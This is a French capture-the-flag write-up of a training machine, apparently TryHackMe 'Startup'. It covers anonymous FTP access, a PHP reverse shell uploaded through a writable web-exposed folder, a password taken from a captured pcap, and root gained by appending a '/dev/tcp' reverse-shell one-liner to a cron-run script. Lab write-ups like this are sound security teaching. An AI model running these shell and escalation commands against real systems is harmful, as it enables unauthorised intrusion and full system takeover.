# Enumération
Dans un premier temps on vas effectuer un scan nmap pour identifier les services et les versions qui tourne sur la machine.

```bash
nmap -sV -sC -p- 10.130.130.74

21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

On voit que on a 3 ports d'ouvert.

## FTP
On tente de se connecter au FTP en anonyme
````bash
ftp 10.130.130.74

login: anonymous
password: (vide)
````

On a pu se connecter au ftp en anonyme on liste ce que l'on a dessus et on recupere tout pour analyser.

````bash
ftp> ls -la

ftp> get important.jpg

ftp> get notice.txt
````

On a donc récupérer deux fichiers on vas les ouvrir afin de les analyser.

````bash
cat notice.txt

Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
````

important.jpg
![[Pasted image 20260620111831.png]]


## WEB

On ouvre un navigateur et on vas voir sur l'ip au port 80.

A la racine du site / on peux voir un message disant que le site est en cours de construction.
Il chercher un développeur web et pour cela il ont mis un lient vers un mailto.

On tente d'aller voir un éventuel /robots.txt mais le serveur nous renvoie not found.

On vas donc faire une énumération avec gobuster.
````bash
gobuster dir -u http://10.130.130.74 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
````

On obtient seulement une réponse files en status 301 (redirection) a cette addresse http://10.130.130.74:80/files
Quand on se rend sur l'url cela nous renvoie sur un page ou l'on accède au ftp donc au meme fichier que l'on a déjà récupérer plus tot.

## Retour sur le ftp
On vas essayer d'upload un fichier sur le ftp.
On se créer un fichier test.txt et on vas essayer de l'upload.
````bash
ftp> put test.txt
553 could not create file
ftp> pwd
/

ftp> cd ftp
ftp> pwd
/ftp
ftp> put test.txt
226 transfer complete
````

Ici on viens de voir que l'on peux upload des fichiers sur le ftp dans le répertoire /ftp
on a également vu que depuis le navigateur on a accès au fichiers et on peux les lire on vas donc faire un reverse-shell php pour avoir accès a la machine.


````bash
cp /usr/share/webshells/php/php-reverse-shell.php /LAB

nano php-reverse-shell.php
````
Ici on viens récupérer un reverse shell php pret a l'emploie et on modifie l'ip et le port a l'intérieur pour qu'il point vers notre machine.

On vas par la suite mettre notre kali en écoute sur le port avec netcat et on vas upload le reverse shell et l'executer depuis le navigateur.

````bash
nc -lvnp 4444
````

Sur le navigateur on vas sur l'url du fichier que l'on a déposer http://10.130.130.74/files/ftp/php-reverse-shell.php

ce qui trigger notre netcat et débloque notre accès a la machine.

## Accès a la machine

Une fois sur la machine je tape les commande
````bash
$ whoami
www-data
$ pwd
/
$ ls -la
résultat de la liste
````


On voit un fichier recipe.txt a la racine je fait la commande cat pour voir son contenu
Et on obtient le premier flag "love" qui est l'ingrédient secret de la recette.

on a également un dossier incidents
quand on liste ce que l'on a l'intérieur on a un fichier qui s'appelle suspicious.pcapng
On l'exfiltre pour le passer dans wireshark

````bash
python3 -m http.server 8888

wget http://10.130.130.74:8888/suspicious.pcapng

wireshark suspicious.pcapng
````

Dans wireshark on a du trie le traffic avec le filtre http
On voit que quelqu'un a fait une webshell.php
on filtre donc le traffic sur un port suspet du style tcp.port == 4444
on a des résultats et on follow le stream tcp de ces dernière
le traffic etant clair on trouve le mot de passe du user lennie

![[Pasted image 20260620174023.png]]

On vas maintenant se connecter en tant que lennie

````bash
ssh lennie@10.130.130.74

pwd
/home/lennie

whoami
lennie

ls -la
user.txt
scripts
Documents

cat user.txt
THM{flag}
````

On vas regarder le contenu des deux dossiers que l'on a trouver ainsi que le contenu de leur fichier

Dans documents rien d'interessant par contre dans scripts
On a un scripts planner.sh qui fait appel a un autre script que root execute en cron
donc on regarde les permissions de des scripts

`````bash
cd scripts

ls -la
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Jun 20 15:48 startup_list.txt

cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh

ls -la /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh

echo "bash -i >& /dev/tcp/192.168.128.175/9999 0>&1" >> /etc/print.sh

Sur un autre shell

nc -lvnp 9999

root@startup:~# pwd
pwd
/root
root@startup:~# whoami
whoami
root
root@startup:~# ls -la
ls -la
total 28
drwx------  4 root root 4096 Nov 12  2020 .
drwxr-xr-x 25 root root 4096 Jun 20 14:41 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Nov 12  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   38 Nov 12  2020 root.txt
drwx------  2 root root 4096 Nov 12  2020 .ssh
root@startup:~# cat root.txt
cat root.txt
THM{flag}
`````

